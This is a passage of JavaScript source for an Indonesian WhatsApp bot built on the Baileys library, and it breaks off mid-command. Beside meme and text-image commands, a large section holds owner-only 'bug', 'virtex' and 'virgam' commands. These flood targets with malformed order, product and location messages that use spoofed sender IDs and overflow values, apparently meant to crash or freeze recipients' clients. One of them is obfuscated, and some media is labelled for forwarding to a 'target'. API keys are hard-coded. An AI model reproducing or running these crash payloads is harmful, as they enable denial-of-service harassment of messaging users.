                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, video, options)
                         fs.unlinkSync(file)
                     } else{
                       reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
                     }
                     break
                     case 'tagall':
                       if (!isGroupAdmins) return reply(mess.only.admin)
                        members_id = []
                        teks = (args.length > 1) ? body.slice(8).trim() : '*Info :*'
                        teks += '\n\n'
                        for (let mem of groupMembers) {
                           teks += `â• âž¥ @${mem.jid.split('@')[0]}\n`
                           members_id.push(mem.jid)
                        }
                        reply(teks)
                        break
case 'spongebob':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/spongebob?apikey=hardianto&pp=${anu.display_url}`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'hengker':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker2?apikey=hardianto&pp=${anu.display_url}`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'hengker2':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker3?apikey=hardianto&pp=${anu.display_url}`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'rip':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/rip?image=${anu.display_url}&apikey=hardianto`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'stonk':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/stonk?image=${anu.display_url}&apikey=hardianto`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'notstonk':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/not-stonk?image=${anu.display_url}&apikey=hardianto`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'patrick':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await pebz.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/patrick?apikey=hardianto&pp=${anu.display_url}`)
	 pebz.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break                  
case 'sharelock':
if (!arg) return reply(`Contoh Penggunaan ${prefix}sharelock Text`)
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
pebz.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'tesbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await pebz.toggleDisappearingMessages(from, 0)
break
	case 'xbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
await pebz.toggleDisappearingMessages(from, 0)
					break
					case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
pebz.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${NamaOwner}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
					case 'bugtroli3':
              if (!isOwner && !mek.key.fromMe) 
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
pebz.sendMessage(nomor, `â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’
â–’â–’â–’â–’â–’â–’â–’â–’â–„â–„â–„â–„â–„â–„â–„â–„â–’â–’â–’â–’â–’â–’
â–’â–’â–ˆâ–’â–’â–’â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–’â–’â–’â–’
â–’â–ˆâ–â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’
â–’â–Œâ–â–’â–’â–ˆâ–ˆâ–„â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â–„â–ˆâ–ˆâ–’â–’â–’
â–â”¼â–â–’â–’â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆâ–’â–’â–’
â–â”¼â–â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
â–â–„â–â–ˆâ–ˆâ–ˆâ–ˆâ”€â–€â–â–â–€â–ˆâ”€â–ˆâ”€â–Œâ–â–ˆâ–ˆâ–„â–’
â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–â–ˆâ–ˆâ–ˆâ–Œ
â–’â–’â–ˆâ–€â–€â–ˆâ–ˆâ–„â–ˆâ”€â–„â”€â”€â”€â–â”€â–„â–ˆâ–ˆâ–ˆâ–€â–’
â–’â–’â–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’
â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–â–Œâ–ˆâ–ˆâ–Œâ–’â–’â–’
â–’â–’â–’â–’â–’â–â–€â–â–’â–Œâ–€â–ˆâ–€â–’â–â–’â–ˆâ–’â–’â–’â–’â–’
â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–â–’â–’â–’â–’â–Œâ–’â–’â–’â–’â–’
â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: 'â˜ ï¸Asylumâ˜ ï¸',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
pebz.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bbaij72njnwjibdo16830nslm1782':
reply(`${ngazap(prefix)}`)
break
case 'virtex':
	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'tovirvid' :
case 'virvid':
			if (!isGroup) return reply(mess.only.group)
			reply(mess.wait)
			if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await pebz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 234,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pebz.sendMessage(from, ini_buffer, video, {quoted: mek, thumbnail:virgam, caption: 'Nih Videonya\n\nâš ï¸*Perhatian.!!*âš ï¸\nVideo ini Mengandung Virvid/Bug SW!!'}, options)
            fs.unlinkSync(file)
        } else{
          reply(`Ada Kesalahan.. Silahkan Reply Videonya ketik ${prefix}tovirvid`)
        }
        break
case 'tovirgam':
  case 'jadivirgam':
    case 'tobug':
if (!isQuotedSticker) return reply(' reply sticker Yang mau dijadikan Virgam anjeng')
reply(mess.wait)
const virgamnye = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
virgamm = await pebz.downloadAndSaveMediaMessage(virgamnye, './media/sampah')
ran = getRandom('.png')
exec(`ffmpeg -i ${virgamm} ${ran}`, (err) => {
fs.unlinkSync(virgamm)
if (err) return reply('BABI KALI KAU, VIRGAM = VIRUS GAMBAR, NAH GAMBAR EMANG ADA YANG BERGERAK? TOLOL..!!')
buffer = fs.readFileSync(ran)
pebz.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Fotonya\n\nâš ï¸*Perhatian.!!*âš ï¸\nFoto ini Mengandung Virgam/Bug SW!!\nTeruskan Gambar ini ke Target/jadikan SW'})
fs.unlinkSync(ran)
})
break
	case 'bugkatalog':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  					pebz.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./media/image/pebz.jpg`)
imeu = await pebz.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await pebz.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62895362282300@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  pebz.relayWAMessage(res)
  pebz.toggleDisappearingMessages(from,`Ups :v`,text)
  break
case 'bugloc':
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./media/image/pebz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);pebz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
         break
case 'x':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
             anu = body.slice(11)
              pebz.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
                case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 pebz.toggleDisappearingMessages(from, 0)
               pebz.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: 'ðŸ”¥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/pemuda.png",
                "thumbnail": fs.readFileSync(`./media/image/pebz.jpg`),
                "sourceUrl": "https://youtube.com/c/ZansLord"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        pebz.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{disText:'âš”ï¸ pebz Teknologi âš”ï¸'},type:1}])
        pebz.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
pebz.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
pebz.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
pebz.toggleDisappearingMessages(from, 0)
break
case 'bugtrolites':
 const pebz6 = fs.readFileSync(`./media/image/pebz.jpg`)
pebz.sendMessage(from, {quoted: ftrol, thumbnail: fs.readFileSync('./media/virgam.jpeg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})
break
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await pebz.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        pebz.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        pebz.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 pebz.toggleDisappearingMessages(from, 'HACKED')
pebz.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    pebz.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
pebz.updatePresence(from, Presence.composing)
		       pebz.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `${NamaBot}`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${NamaBot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
pebz.updatePresence(from, Presence.composing)
pebz.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break      
case "report":
  case "reportbug":
    case "bugreport":
      case "error":
  if (args.length < 1) return reply('[ ! ] Pesannya mana? Contoh â€º *!bugreport Kak, Menu error.*') 
const kontil = body.slice(8)
                      if (kontil.length > 300) return pebz.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    pebz.sendMessage('6285869074622@s.whatsapp.net', options, text, {quoted: mek})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break
case 'halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
//Xchillds
case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz TEKNOLOGI`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
               case 'googletxt':
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz|chan|kawai`)
             makell = args.join(" ")
             ll1 = makell.split("|")[0];
             ll2 = makell.split("|")[1];
             ll3 = makell.split("|")[0];
             reply(mess.wait)
